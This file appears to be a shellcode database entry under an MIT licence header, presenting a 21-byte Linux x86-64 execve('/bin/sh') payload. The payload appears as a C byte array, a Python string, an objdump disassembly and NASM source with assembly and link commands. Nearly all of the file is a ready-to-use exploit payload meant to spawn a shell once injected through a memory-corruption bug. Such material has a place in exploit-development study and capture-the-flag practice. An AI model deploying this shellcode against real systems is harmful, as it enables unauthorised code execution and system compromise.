;================================================================================
; The MIT License
;
; Copyright (c) <year> <copyright holders>
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.
;================================================================================
;     Name : Linux/x86-64 - execve("/bin/sh") 21 Bytes
;     Author : WangYihang
;     Email : wangyihanger@gmail.com
;     Tested on: Linux_x86-64
;================================================================================
; Shellcode (c array) :
char shellcode[] = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69"
                             "\x6e\x2f\x2f\x73\x68\x57\x48\x89"
                             "\xe7\xb0\x3b\x0f\x05";
;================================================================================
; Shellcode (python) :
shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
;================================================================================
; objdump -d ./shellcode
shellcode:     file format elf64-x86-64
Disassembly of section .text:
0000000000400080 <_start>:
  400080:       f7 e6                   mul    %esi
  400082:       50                      push   %rax
  400083:       48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
  40008a:       2f 73 68
  40008d:       57                      push   %rdi
  40008e:       48 89 e7                mov    %rsp,%rdi
  400091:       b0 3b                   mov    $0x3b,%al
  400093:       0f 05                   syscall
;================================================================================
; Assembly language code :
; You can asm it by using :
; nasm -f elf64 ./shellcode.asm
; ld -o shellcode shellcode.o
global _start
        _start:
                mul esi
                push rax
                mov rdi, "/bin//sh"
                push rdi
                mov rdi, rsp
                mov al, 59
                syscall
;================================================================================